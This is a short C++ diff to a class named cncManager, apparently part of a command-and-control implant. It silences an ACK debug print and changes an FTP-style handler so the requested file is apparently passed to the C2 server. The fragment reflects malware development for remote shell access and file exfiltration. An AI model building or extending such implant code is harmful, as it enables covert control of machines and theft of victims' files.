@@ -183,7 +183,7 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
             {
                 case ACK:
                 {
-                    this->printParsedResponse(resData, "ACK");
+                    //this->printParsedResponse(resData, "ACK");
                     break;
                 }
 
@@ -271,5 +271,5 @@ void cncManager::handleShellRequest() {
 
 void cncManager::handleFtpRequest(std::string path) {
     commandManager commander;
-    commander.getFile(path);
+    commander.getFile(path,this->server);
 }
